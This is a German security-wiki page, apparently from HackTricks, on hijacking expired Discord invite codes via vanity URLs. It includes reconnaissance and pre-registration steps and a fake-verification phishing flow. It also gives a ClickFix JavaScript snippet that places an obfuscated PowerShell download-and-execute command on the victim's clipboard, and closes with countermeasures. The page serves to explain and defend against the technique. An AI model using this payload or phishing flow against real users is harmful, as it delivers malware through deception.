# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Die Schwachstelle im Discord-Invite-System ermöglicht es Threat Actors, abgelaufene oder gelöschte Invite-Codes (temporäre, permanente oder benutzerdefinierte Vanity-Codes) als neue Vanity-Links auf jedem Server mit Level 3 Boost zu beanspruchen. Durch die Normalisierung aller Codes in Kleinbuchstaben können Angreifer bekannte Invite-Codes vorab registrieren und den Traffic unbemerkt hijacken, sobald der ursprüngliche Link abläuft oder der Quellserver seinen Boost verliert.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite-Typen und Hijack-Risiko

| Invite-Typ            | Übernehmbar? | Bedingung / Kommentare                                                                                   |
|-----------------------|--------------|-----------------------------------------------------------------------------------------------------------|
| Temporärer Invite-Link | ✅          | Nach Ablauf wird der Code verfügbar und kann von einem Server mit Boost erneut als Vanity URL registriert werden. |
| Permanenter Invite-Link | ⚠️        | Wenn er gelöscht wurde und ausschließlich aus Kleinbuchstaben und Ziffern besteht, kann der Code wieder verfügbar werden. |
| Benutzerdefinierter Vanity-Link | ✅   | Wenn der ursprüngliche Server seinen Level 3 Boost verliert, wird sein Vanity Invite für eine neue Registrierung verfügbar. |

## Exploitation-Schritte

1. Reconnaissance
- Überwache öffentliche Quellen (Foren, soziale Medien, Telegram-Kanäle) auf Invite-Links, die dem Muster `discord.gg/{code}` oder `discord.com/invite/{code}` entsprechen.<sup>[[1]](#references)</sup>
- Sammle interessante Invite-Codes (temporäre oder Vanity-Codes).
2. Pre-registration
- Erstelle einen neuen Discord-Server mit Level 3 Boost-Berechtigungen oder verwende einen bereits vorhandenen.
- Versuche unter **Server Settings → Vanity URL**, den Ziel-Invite-Code zuzuweisen. Wenn er akzeptiert wird, ist der Code durch den bösartigen Server reserviert.
3. Hijack-Aktivierung
- Warte bei temporären Invites, bis der ursprüngliche Invite abläuft (oder lösche ihn manuell, wenn du den Quellserver kontrollierst).
- Bei Codes mit Großbuchstaben kann die Kleinschreibungsvariante sofort beansprucht werden, die Weiterleitung wird jedoch erst nach Ablauf aktiviert.
4. Unbemerkte Weiterleitung
- Benutzer, die den alten Link aufrufen, werden nahtlos an den vom Angreifer kontrollierten Server weitergeleitet, sobald der Hijack aktiv ist.

## Phishing-Ablauf über einen Discord-Server

1. Beschränke die Server-Kanäle, sodass nur ein **#verify**-Kanal sichtbar ist.<sup>[[1]](#references)</sup>
2. Setze einen Bot ein (z. B. **Safeguard#0786**), der neue Benutzer auffordert, sich über OAuth2 zu verifizieren.
3. Der Bot leitet Benutzer unter dem Vorwand eines CAPTCHA- oder Verifizierungsschritts auf eine Phishing-Website weiter (z. B. `captchaguard.me`).
4. Implementiere den **ClickFix**-UX-Trick:
- Zeige eine fehlerhafte CAPTCHA-Meldung an.
- Weise Benutzer an, den **Win+R**-Dialog zu öffnen, einen vorbereiteten PowerShell-Befehl einzufügen und Enter zu drücken.

### ClickFix Clipboard Injection Example
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Dieser Ansatz vermeidet direkte Datei-Downloads und nutzt vertraute UI-Elemente, um den Verdacht der Benutzer zu verringern.<sup>[[1]](#references)</sup>

## Gegenmaßnahmen

- Verwenden Sie dauerhafte Invite-Links, die mindestens einen Großbuchstaben oder ein nicht alphanumerisches Zeichen enthalten (laufen niemals ab, nicht wiederverwendbar).<sup>[[1]](#references)</sup>
- Wechseln Sie Invite-Codes regelmäßig und widerrufen Sie alte Links.
- Überwachen Sie den Discord-Server-Boost-Status und die Beanspruchung von Vanity-URLs.
- Schulen Sie Benutzer darin, die Authentizität eines Servers zu überprüfen und das Ausführen von aus der Zwischenablage eingefügten Befehlen zu vermeiden.

## Referenzen

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
